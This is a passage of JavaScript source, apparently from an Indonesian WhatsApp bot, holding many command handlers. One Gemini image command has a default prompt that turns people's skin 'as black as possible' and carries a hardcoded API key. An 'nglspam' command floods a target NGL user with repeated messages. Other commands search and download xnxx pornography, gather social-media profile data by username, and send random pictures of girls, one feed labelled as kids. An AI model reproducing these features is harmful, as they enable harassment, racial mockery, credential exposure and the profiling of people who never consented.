  let defaultPrompt = "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);

  let promptText = text || defaultPrompt;
  await XReaction()

  try {
    let imgData = await m.quoted.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    let resultText = "";

    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = `./tmp/gemini_${Date.now()}.png`;
      fs.writeFileSync(tempPath, resultImage);

      await Alice.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Succes*`
      }, { quoted: m });

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      reply("Gagal Menghitamkan.");
    }
  } catch (error) {
    console.error(error);
    reply(`Error: ${error.message}`);
  }
}
break;
            
case 'toanime': 
case 'toreal': {
if (!isPrem) return XRP()
    let actionType = ({ 
      toanime: 'anime2d',
      toreal: "anime2real"
    })[command]
    try {
      let media = await Alice.downloadAndSaveMediaMessage(qmsg);
      if (/image/.test(mime)) {
          await await XReaction(); 
              let url = await uploadToCatbox(media);
            let tryng = 0;
            let aifilter = await fetch(`${apii.xterm.url}/api/img2img/filters?action=${actionType}&url=${url}&key=${apii.xterm.key}`)
            .then(response => response.json());

            if(!aifilter.status) return reply(aifilter?.msg || "Error!")

            while (tryng < 50) {
                tryng += 1;
                let s = await fetch(`${apii.xterm.url}/api/img2img/filters/batchProgress?id=${aifilter.id}`)
                .then(response => response.json());

                if (s.status === 3) {
                  return Alice.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m })                
                } else if (s.status === 4) {
                  reply("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
                  return
                }
             await new Promise(resolve => setTimeout(resolve, 2000));
            }


      } else {
          reply(`reply/kirim gambar dengan caption ${XyrooRynzz}`);
      }
      await fs.unlinkSync(media);
    } catch (err) {
      reply(`Error: ${err.message}`);
    }
}
break

case 'img2video': 
case 'luma': {
if (!isPrem) return XRP()
    const axios = require('axios');
    try {
      let media = await Alice.downloadAndSaveMediaMessage(qmsg);
      if (/image/.test(mime)) {
          await await XReaction(); 
              let url = await uploadToCatbox(media);
          const response = await axios.post(`${apii.xterm.url}/api/img2video/luma?key=${apii.xterm.key}${text ? ("&prompt=" + text) : ""}`, media, {
                headers: {
                    'Content-Type': 'application/octet-stream'
                },
                responseType: 'stream'
            })
             let rsp = "rfz"
            response.data.on('data', async (chunk) => {
                try {
                    const eventString = chunk.toString()
                    const eventData = eventString.match(/data: (.+)/)
                    if (eventData && eventData[1]) {
                        let data
                           try {
                              data = JSON.parse(eventData[1])
                            } catch (e) {
                              console.loc(eventData[1])
                              data = {}
                            }
                        switch (data.status) {
                            case "processing":
                              reply("Processing... _ini mungkin memakan waktu sekitar 1-5 menit!_")
                            break
                            case "failed":
                                await reply(data.status)
                                response.data.destroy()
                                break
                            case "completed":
                                await Alice.sendMessage(m.chat, { video: { url: data.video.url }, mimetype: "video/mp4" }, { quoted: m })
                                response.data.destroy()
                                break
                            default:
                                console.log('Unknown status:', data)
                        }
                    }
                } catch (e) {
                    console.error('Error processing chunk:', e.message)
                    response.data.destroy()
                    reply("Err!!")
                }
            })
      } else {
          reply(`reply/kirim gambar dengan caption ${XyrooRynzz}`);
      }
      await fs.unlinkSync(media);
    } catch (err) {
      reply(`Error: ${err.message}`);
    }
}
break

case "animediff": {
if (!isPrem) return XRP()
  if(!text) return reply("Harap sertakan promptnya!")
  await await XReaction()
  await Alice.sendMessage(m.chat, { image: { url: apii.xterm.url + "/api/text2img/animediff?prompt="+text + "&key=" + apii.xterm.key } }, { quoted: m })
}
break
case "dalle3": {
if (!isPrem) return XRP()
  if(!text) return reply("Harap sertakan promptnya!")
  await await XReaction()
  await Alice.sendMessage(m.chat, { image: { url: apii.xterm.url + "/api/text2img/dalle3?prompt="+text + "&key=" + apii.xterm.key } }, { quoted: m })
}
break
case 'xnxxsearch': {
if (!isPrem) return XRP()
    if (!args[0]) return reply(`Tobat Woi\n\nExample : ${XyrooRynzz} Japanese`);

await XReaction()
    let data = await xnxxSearch(text);
    let results = data.result;

    if (results.length > 0) {
        let message = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result) => {
            message += `Title : ${result.title}\nInfo : ${result.info}\nLink : ${result.link}\n\n`;
        });
        reply(message);
    } else {
        reply('Tidak Ada Hasil.');
    }
}
break;

case 'xnxxdl': {
if (!isPrem) return XRP()
    if (!args[0]) return reply(`Input Parameter Url Dari ${command}\n\nExample : ${XyrooRynzz} Url`);

await XReaction()
    let data = await xnxxDownloader(text);
    
    let capp = `XNXX DL\nTitle : ${data.title}\nDurasi : ${data.duration}\nUrl : ${data.URL}\n`;
    
    await Alice.sendMessage(m.chat, {
        video: {
            url: data.files.high
        },
        caption: capp,
    }, {
        quoted: m
    });
}
break;

case "hdvideo":
case "hdvid": {
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
    const path = require('path');

    if (!ffmpegStatic) {
        return reply('Send/reply Videg Yang Ingin Di Hd Kan')
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return Alice.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return Alice.sendMessage(m.chat, { text: `Format ${mime} tidak didukung!` }, { quoted: m });
        }
        Alice.sendMessage(m.chat, { text: "Meproses peningkatan, tunggu beberapa menit..."}, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return Alice.sendMessage(m.chat, { text: "Gagal mengunduh video!" }, { quoted: m });
        let tempDir = path.join(__dirname, 'tmp');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'faster',
                    '-crf', '25',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await Alice.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: `Berhasil\n${packname}`
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        Alice.sendMessage(m.chat, { text: "Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break

		case 'ssweb': {
if (!isPrem) return XRP()
				if (!text) return reply(`Example: ${XyrooRynzz} https://`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await Alice.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await Alice.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
			
case 'ytstalk': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} XyrooRynzz`)
    const apiUrl = await fetchJson(`https://fastrestapis.fasturl.cloud/stalk/youtube?username=${text}`)
    const ytData = apiUrl.result

    if (ytData) {
      const response = `
*YOUTUBE STALKER:*\n
- Nama Channel: ${ytData.channel}
- Deskripsi: ${ytData.description ? ytData.description : 'Tidak ada'}
- URL Channel: ${ytData.url}
- Total Subscriber: ${ytData.additionalInfo.totalSubs}
- Total Video: ${ytData.additionalInfo.totalVideos}
- Total Views: ${ytData.additionalInfo.views}
- Bergabung pada: ${ytData.additionalInfo.join}
- Link Channel: ${ytData.additionalInfo.chUrl}
      
*Gambar Profil:*
${ytData.profile}

*Gambar Background:*
${ytData.bgUrl}
      `

      reply(response)
    }
  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan')
  }
}
break

case 'ttstalk': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} djayyz_1`)

    const apiUrl = await fetchJson(`https://vapis.my.id/api/tt-stalk?username=${text}`)
    if (apiUrl && apiUrl.data) {
      const user = apiUrl.data.user
      const stats = apiUrl.data.stats

      const response = `
*Username:* ${user.uniqueId}
*Nickname:* ${user.nickname}
*Region:* ${user.region}
*Verified:* ${user.verified ? 'Yes' : 'No'}
*Followers:* ${stats.followerCount}
*Following:* ${stats.followingCount}
*Likes:* ${stats.heartCount}
*Videos:* ${stats.videoCount}
*Profile Picture:* ${user.avatarLarger}
`
      return reply(response)
    } 

    const co = await ttstalk(text)
    if (co.userInfo) {
      const cu = co.userInfo
      const respon = `
*Username:* ${cu.uniqueId}
*Nickname:* ${cu.nickname}
*Bio:* ${cu.bio}
*Followers:* ${cu.followers}
*Following:* ${cu.following}
*Likes:* ${cu.likes}
*Videos:* ${cu.videos}
*Profile Picture:* ${cu.avatar}
`
      return reply(respon)
    }

    reply('Gak ketemu username nya')
  } catch (err) {
    console.error(err)
    return reply('Terjadi kesalahan')
  }
}
break

			case 'telestalk': case 'telegramstalk': {
if (isBan) return XRB()
await XReaction()
				if (!text) return reply(`Example: ${XyrooRynzz} usernamenya`)
				try {
					const res = await telegramStalk(text)
					if (!res.description || res.title.startsWith('Telegram: Contact')) throw 'Error'
					reply({ image: { url: res.image_url }, caption: `*Username :* ${text}\n*Nickname :* ${res.title || 'Tidak ada'}\n*Desc :* ${res.description || 'Tidak ada'}\n*Url :* ${res.url}`})
				} catch (e) {
					reply('Username Tidak ditemukan!')
				}
			}
			break
			case 'igstalk': case 'instagramstalk': {
if (isBan) return XRB()
await XReaction()
				if (!text) return reply(`Example: ${XyrooRynzz} usernamenya`)
				try {
					let anu = await instaStalk(text)
					reply({ image: { url: anu.avatar }, caption: `*Username :* ${anu.username}\n*Nickname :* ${anu.nickname}\n*Bio :* ${anu.description}\n*Posts :* ${anu.posts}\n*Followers :* ${anu.followers}\n*Following :* ${anu.following}\n*List Post :* ${anu.list_post.map(a => `\n*Url :* ${a.imageUrl}\n*Description :* ${a.description}\n*Detail :* ${a.detailUrl}`).join('\n')}` })
				} catch (e) {
					try {
						let res = await fetchApi('/stalk/instagram', { username: text });
						reply({ image: { url: res.data.profile_picture_url }, caption: `*Username :*${res.data?.username || 'Tidak Ada'}\n*Nickname :*${res.data?.full_name || 'Tidak Ada'}\n*ID :*${res.data?.instagram_id}\n*Followers :*${res.data?.followers || '0'}\n*Following :*${res.data?.following || '0'}\n*Description :*${res.data?.description || 'Tidak Ada'}\n*Website :*${res.data?.website || 'Tidak Ada'}\n*Add At :*${res.data?.added_date}\n*Uploads :*${res.data?.uploads}\n*Verified :*${res.data?.is_verified}\n*Private :*${res.data.is_private}\n` })
					} catch (e) {
						reply('Username Tidak ditemukan!')
					}
				}
			}
			break

case 'chstalk': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} https://whatsapp.com/channel/abcdefg`)
    const co = await chstalk(text)
    if (co) {
      const respon = `
*Nama Channel:* ${co.nama}
*Pengikut:* ${co.pengikut}
*Deskripsi:* ${co.deskripsi}
*Link Channel:* ${co.linkChannel}
*Gambar:* ${co.gambar}
`
      return reply(respon)
    }

    reply('Gak ketemu channel nya')
  } catch (err) {
    console.error(err)
    return reply('Terjadi kesalahan')
  }
}
break

case 'ffstalk': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} 12345678`)
    const apiUrl = await fetchJson(`https://vapis.my.id/api/ff-stalk?id=${text}`)
    const ffData = apiUrl.data.account
    if (ffData) {
      const guild = apiUrl.data.guild
      const response = `
*Nama Akun:* ${ffData.name}
*Level:* ${ffData.level}
*Region:* ${ffData.region}
*Like:* ${ffData.like}
*Bio:* ${ffData.bio}
*Guild:* ${guild.name} (Level ${guild.level})
*BR Points:* ${ffData.BR_points}
*CS Points:* ${ffData.CS_points}
*Pet:* ${apiUrl.data.pet_info.name} (Level ${apiUrl.data.pet_info.level})
      `
      reply(response)
    } else {
      reply('Data tidak ditemukan')
    }
  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan')
  }
}
break

case 'mlstalk': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} 109088431, 2558`)
    const [id, zoneId] = text.split(',') || text.split(', ')
    if (!id || !zoneId) return reply('Masukkan id dan zoneid')

    const apiUrl = await fetchJson(`https://vapis.my.id/api/ml-stalk?id=${id}&zoneid=${zoneId}`)
    const mlData = apiUrl.data.data
    if (mlData) {
      const product = mlData.product
      const item = mlData.item
      const response = `
*Game:* ${product.name}
*Item:* ${item.name}
*Harga:* ${item.price}
*Username Game:* ${mlData.gameDetail.userName}
*Channel Pembayaran:* ${mlData.paymentName}
*Deskripsi Produk:* ${product.description}
*Gambar Produk:* ${product.imageDisplay}
      `
      reply(response)
    } else {
      reply('Data tidak ditemukan')
    }
  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan')
  }
}
break

case 'npmstalk': {
if (isBan) return XRB()
await XReaction()
  try {
    if (!text) return reply(`Contoh: ${XyrooRynzz} express`)
    let npmData = await npmStalk(text)
    
    const response = `
*Package:* ${npmData.name}
*Versi:* ${npmData.versionLatest}
*Versi Pertama:* ${npmData.versionPublish}
*Jumlah Versi:* ${npmData.versionUpdate}
*Versi Terbaru:* ${npmData.latestDependencies}
*Versi Pertama:* ${npmData.publishDependencies}
*Waktu Rilis Pertama:* ${npmData.publishTime}
*Waktu Rilis Terbaru:* ${npmData.latestPublishTime}
    `
    reply(response)
  } catch (err) {
    console.error(err)
    reply('Wah ada yang error, coba lagi nanti!')
  }
}
break

            case 'reminder': {
if (!isPrem) return XRP()
                if (!args[0] || !args[1] || !args[2]) return reply('*contoh : Reminder Waktu Detik/Menit/Jam Pesan*\n\n*Contoh : Reminder 30 Menit Jangan Lupa Sholat*')
                const time = parseInt(args[0]) * (args[1].match(/(m|minute)/i) ? 60 : args[1].match(/(h|hour)/i) ? 3600 : 1) * 1000
                const message = args.slice(2).join(' ')
                setTimeout(() => {
                    Alice.sendMessage(m.chat, { text: `*Reminder Untuk @${sender.split("@")[0]}*\n\n📑 *Dengan Pesan :* ${message}`, contextInfo: { mentionedJid: [sender] } }, { quoted: m })
                }, time)
                reply(`*Berhasil Mengatur Reminder Untuk ${args[0]} ${args[1]} Ke Depan*`)
            }
                break


case 'nglspam':{
if (!isPrem) return XRP()
    if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
        return reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam username|haloo|5");
    }
    const [username, message, count] = text.split("|");
    const spamCount = parseInt(count, 10);
    if (isNaN(spamCount) || spamCount <= 0) {
        return reply("Jumlah spam harus berupa angka positif!");
    }
    try {
        await nglspam(username, message, spamCount);
        reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
    } catch (e) {
        console.error(e); // Menambahkan logging error untuk debug
        return reply("Fitur error, coba lagi nanti.");
    }
}
break

case 'threads': {
if (!isPrem) return XRP()
if (!args || !args[0]) return reply(`Example: ${XyrooRynzz} https://www.threads.net/@httpnald_/post/CwWvCFvJr_N/?igshid=NTc4MTIwNjQ2YQ==`)
await XReaction()
let timestamp = speed()
let latensi = speed() - timestamp
const json = await fetchJson(`https://aemt.uk.to/download/threads?url=${text}`)
Alice.sendMessage(m.chat, { video: { url: json.result.videourls[0].download_url }, caption: `🍟 *Fetching* : ${latensi.toFixed(4)} ms` }, { quoted: m })
}
break

case 'threadsimg': {
if (!isPrem) return XRP()
if (!args || !args[0]) return reply(`Example: ${XyrooRynzz} https://www.threads.net/t/Cujx6ryoYx6/?igshid=NTc4MTIwNjQ2YQ==`)
let timestamp = speed()
let latensi = speed() - timestamp
const json = await fetchJson(`https://aemt.uk.to/download/threads?url=${text}`)
Alice.sendMessage(m.chat, { image: { url: json.result.image_urls }, caption: 'succes' }, { quoted: m })
}
break	

case "githubstalk":
case "ghstalk":
 if (!q) return reply(`Masukkan username GitHub!\nContoh: ${XyrooRynzz} xyrooo2`);
 let urll = `https://simple-api.luxz.xyz/api/tools/githubstalk?user=${q}`;
 try {
 const { data } = await axios.get(urll);
 if (!data.status) return reply("User tidak ditemukan!");
 let { username, nickname, bio, id, nodeId, profile_pic, url, type, admin, company, blog, location, email, public_repo, public_gists, followers, following, ceated_at, updated_at } = data.result;
 
 let caption = `*GitHub Stalk*\n\n`;
 caption += `👤 *Username:* ${username}\n`;
 caption += `📛 *Nickname:* ${nickname || "-"}\n`;
 caption += `📜 *Bio:* ${bio || "-"}\n`;
 caption += `🆔 *ID:* ${id}\n`;
 caption += `🔗 *Node ID:* ${nodeId}\n`;
 caption += `🌍 *URL:* ${url}\n`;
 caption += `📌 *Type:* ${type}\n`;
 caption += `🛠 *Admin:* ${admin ? "✅" : "❌"}\n`;
 caption += `🏢 *Company:* ${company || "-"}\n`;
 caption += `🔗 *Blog:* ${blog || "-"}\n`;
 caption += `📍 *Location:* ${location || "-"}\n`;
 caption += `📧 *Email:* ${email || "-"}\n`;
 caption += `📂 *Public Repo:* ${public_repo}\n`;
 caption += `📑 *Public Gists:* ${public_gists}\n`;
 caption += `👥 *Followers:* ${followers}\n`;
 caption += `👤 *Following:* ${following}\n`;
 caption += `📅 *Created At:* ${ceated_at}\n`;
 caption += `🔄 *Updated At:* ${updated_at}\n`;
 Alice.sendMessage(m.chat, { image: { url: profile_pic }, caption }, { quoted: m });
 } catch (err) {
 console.error(err);
 reply("Terjadi kesalahan saat mengambil data.");
 }
 break

case 'gempa':
            case 'infogempa': {
            if (!isPrem) return XRP()
                try {
                    const res = await fetch('https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json')
                    const data = await res.json()
                    const gempa = data.Infogempa.gempa
                    let txt = `*${gempa.Wilayah}*\n\n`
                    txt += `Tanggal : ${gempa.Tanggal}\n`
                    txt += `Waktu : ${gempa.Jam}\n`
                    txt += `Potensi : *${gempa.Potensi}*\n\n`
                    txt += `Magnitude : ${gempa.Magnitude}\n`
                    txt += `Kedalaman : ${gempa.Kedalaman}\n`
                    txt += `Koordinat : ${gempa.Coordinates}`
                    if (gempa.Dirasakan.length > 3) {
                        txt += `\nDirasakan : ${gempa.Dirasakan}`
                    }

                    Alice.sendMessage(m.chat, {
                        text: txt, contextInfo: {
                            "externalAdreply": {
                                "title": botname,
                                "body": command,
                                "showAdAttribution": true,
                                "mediaType": 1,
                                "sourceUrl": global.xtele,
                                "thumbnailUrl": thumbnailReply, "renderLargerThumbnail": true
                            }
                        }
                    }, { quoted: m })
                } catch (e) {
                    console.log(e)
                    reply('[!] Ada Yang Error.')
                }
            }
                break
               

case 'readmore': {
if (!isPrem) return XRP()
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    Alice.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;                				

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Premium Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Asupan Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'tiktokgirl':
if (isBan) return XRB()
await XReaction()
var asupan = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
if (isBan) return XRB()
await XReaction()
var gheayubi = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
if (isBan) return XRB()
await XReaction()
var bocil = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
if (isBan) return XRB()
await XReaction()
var ukhty = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
if (isBan) return XRB()
await XReaction()
var santuy = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
if (isBan) return XRB()
await XReaction()
var kayes = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
if (isBan) return XRB()
await XReaction()
var rikagusriani = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break
case 'indo':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
if (isBan) return XRB()
await XReaction()
var notnot = JSON.parse(fs.readFileSync('./AliceSystem/AliceResource/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Alice.sendMessage(m.chat, { caption: 'donee', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Asupan Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Ephoto Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
      case "glitchtext":
      case "writetext":
      case "advancedglow":
      case "typographytext":
      case "pixelglitch":
      case "neonglitch":
      case "flagtext":
      case "flag3dtext":
      case "deletingtext":
      case "blackpinkstyle":
      case "glowingtext":
      case "underwatertext":
      case "logomaker":
      case "cartoonstyle":
      case "papercutstyle":
      case "watercolortext":
      case "effectclouds":
      case "blackpinklogo":
      case "gradienttext":
      case "summerbeach":
      case "luxurygold":
      case "multicoloyellowneon":
      case "sandsummer":
      case "galaxywallpaper":
      case "1917style":
      case "makingneon":
      case "royaltext":
      case "freecreate":
      case "galaxystyle":
      case "lighteffects":
if (isBan) return XRB()
await XReaction()      
        {
          if (!q) {
            return reply(`Contoh : ${XyrooRynzz} Alice Assistent`);
          }
          let link;
          if (/glitchtext/.test(command)) {
            link = "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
          }
          if (/writetext/.test(command)) {
            link = "https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
          }
          if (/advancedglow/.test(command)) {
            link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
          }
          if (/typographytext/.test(command)) {
            link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
          }
          if (/pixelglitch/.test(command)) {
            link = "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
          }
          if (/neonglitch/.test(command)) {
            link = "https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
          }
          if (/flagtext/.test(command)) {
            link = "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
          }
          if (/flag3dtext/.test(command)) {
            link = "https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
          }
          if (/deletingtext/.test(command)) {
            link = "https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
          }
          if (/blackpinkstyle/.test(command)) {
            link = "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
          }
          if (/glowingtext/.test(command)) {
            link = "https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
          }
          if (/underwatertext/.test(command)) {
            link = "https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
          }
          if (/logomaker/.test(command)) {
            link = "https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
          }
          if (/cartoonstyle/.test(command)) {
            link = "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
          }
          if (/papercutstyle/.test(command)) {
            link = "https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
          }
          if (/watercolortext/.test(command)) {
            link = "https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
          }
          if (/effectclouds/.test(command)) {
            link = "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
          }
          if (/blackpinklogo/.test(command)) {
            link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
          }
          if (/gradienttext/.test(command)) {
            link = "https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
          }
          if (/summerbeach/.test(command)) {
            link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
          }
          if (/luxurygold/.test(command)) {
            link = "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
          }
          if (/multicoloyellowneon/.test(command)) {
            link = "https://en.ephoto360.com/create-multicoloyellow-neon-light-signatures-591.html";
          }
          if (/sandsummer/.test(command)) {
